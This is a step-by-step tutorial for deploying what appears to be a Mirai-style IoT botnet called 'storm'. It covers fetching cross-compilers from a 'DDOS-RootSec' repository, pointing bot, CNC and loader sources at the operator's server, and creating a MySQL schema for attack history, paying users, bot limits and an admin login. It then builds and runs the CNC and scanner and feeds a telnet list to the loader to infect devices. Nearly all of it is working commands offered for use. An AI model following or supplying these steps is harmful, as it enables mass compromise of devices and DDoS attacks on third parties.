### Ubuntu and Debian Tutorial

#### Step 1: System Update and Development Tools Installation
1. **Update the system:**
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```
2. **Install development tools and necessary packages:**
   ```bash
   sudo apt install build-essential libgmp-dev screen wget bzip2 gcc nano g++ sudo git libc6-dev apache2 xinetd tftpd tftp gcc-multilib -y
   ```

#### Step 2: MySQL Installation
1. **Download and install MySQL:**
   ```bash
   wget https://dev.mysql.com/get/mysql-apt-config_0.8.22-1_all.deb
   sudo dpkg -i mysql-apt-config_0.8.22-1_all.deb
   sudo apt update
   sudo apt install mysql-server -y
   ```
2. **Start and enable MySQL service:**
   ```bash
   sudo systemctl start mysql
   sudo systemctl enable mysql
   ```

#### Step 3: Download and Extract Cross Compilers
1. **Create directory for cross-compilers:**
   ```bash
   sudo mkdir /etc/xcompile
   cd /etc/xcompile
   ```
2. **Download cross-compilers:**
   ```bash
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-i586.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-i686.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-m68k.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-mips.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-mipsel.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-powerpc.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-sh4.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-sparc.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv4l.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv5l.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv6l.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv7l.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-powerpc-440fp.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-x86_64.tar.bz2
    wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-i486.tar.gz

   ```
3. **Extract the compilers:**
   ```bash
    tar -jxf cross-compiler-i586.tar.bz2
    tar -jxf cross-compiler-m68k.tar.bz2
    tar -jxf cross-compiler-mips.tar.bz2
    tar -jxf cross-compiler-mipsel.tar.bz2
    tar -jxf cross-compiler-powerpc.tar.bz2
    tar -jxf cross-compiler-sh4.tar.bz2
    tar -jxf cross-compiler-i586.tar.bz2
    tar -jxf cross-compiler-i686.tar.bz2
    tar -jxf cross-compiler-sparc.tar.bz2
    tar -jxf cross-compiler-armv4l.tar.bz2
    tar -jxf cross-compiler-armv5l.tar.bz2
    tar -jxf cross-compiler-armv6l.tar.bz2
    tar -jxf cross-compiler-armv7l.tar.bz2
    tar -vxf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
    tar -jxf cross-compiler-powerpc-440fp.tar.bz2
    tar -jxf cross-compiler-x86_64.tar.bz2
    tar -xvf cross-compiler-i486.tar.gz
   ```
4. **Rename directories:**
   ```bash
    mv cross-compiler-i486 i486
    mv cross-compiler-i586 i586
    mv cross-compiler-i686 i686
    mv cross-compiler-m68k m68k
    mv cross-compiler-mips mips
    mv cross-compiler-mipsel mipsel
    mv cross-compiler-powerpc powerpc
    mv cross-compiler-sh4 sh4
    mv cross-compiler-sparc sparc
    mv cross-compiler-armv4l armv4l
    mv cross-compiler-armv5l armv5l
    mv cross-compiler-armv6l armv6l
    mv cross-compiler-armv7l armv7l
    mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
    mv cross-compiler-powerpc-440fp powerpc-440fp
    mv cross-compiler-x86_64 x86_64
   ```
5. **Clean up tar files:**
   ```bash
   rm -rf *.tar.bz2
   cd ~/
   ```

#### Step 4: Setting Up Server IP
- **Modify the following files with your server IP:**
  - `bot/includes.h`
  - `cnc/main.go`
  - `dlr/main.c`
  - `loader/src/main.c`
  - `scanListen`

#### Step 5: Database Setup
1. **Start MySQL service:**
   ```bash
   sudo service mysql start
   ```
2. **Secure MySQL installation:**
   ```bash
   sudo mysql_secure_installation
   ```
3. **Login to MySQL:**
   ```bash
   mysql -u root -p
   ```
4. **Create the database and tables:**
   ```sql
   CREATE DATABASE storm;
   USE storm;
   CREATE TABLE `history` (
     `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
     `user_id` int(10) unsigned NOT NULL,
     `time_sent` int(10) unsigned NOT NULL,
     `duration` int(10) unsigned NOT NULL,
     `command` text NOT NULL,
     `max_bots` int(11) DEFAULT '-1',
     PRIMARY KEY (`id`),
     KEY `user_id` (`user_id`)
   );
   CREATE TABLE `users` (
     `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
     `username` varchar(32) NOT NULL,
     `password` varchar(32) NOT NULL,
     `duration_limit` int(10) unsigned DEFAULT NULL,
     `cooldown` int(10) unsigned NOT NULL,
     `wrc` int(10) unsigned DEFAULT NULL,
     `last_paid` int(10) unsigned NOT NULL,
     `max_bots` int(11) DEFAULT '-1',
     `admin` int(10) unsigned DEFAULT '0',
     `intvl` int(10) unsigned DEFAULT '30',
     `api_key` text,
     PRIMARY KEY (`id`),
     KEY `username` (`username`)
   );
   CREATE TABLE `whitelist` (
     `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
     `prefix` varchar(16) DEFAULT NULL,
     `netmask` tinyint(3) unsigned DEFAULT NULL,
     PRIMARY KEY (`id`),
     KEY `prefix` (`prefix`)
   );
   INSERT INTO users VALUES (NULL, 'root', 'root', 0, 0, 0, 0, -1, 1, 30, '');
   EXIT;
   ```

#### Step 6: Compile and Run
1. **Set MySQL password in the `main.go` of the CNC.**
2. **Change permissions and build:**
   ```bash
   cd ~/
   chmod 0777 * -R
   sh build.sh YOUR_IP
   python payload.py # If applicable
   ```
3. **Start CNC and ScanListen:**
   ```bash
   screen ./cnc
   screen ./scanListen
   ```

4. **Load telnet lists:**
   ```bash
   cat list.txt | ./loader
   ```
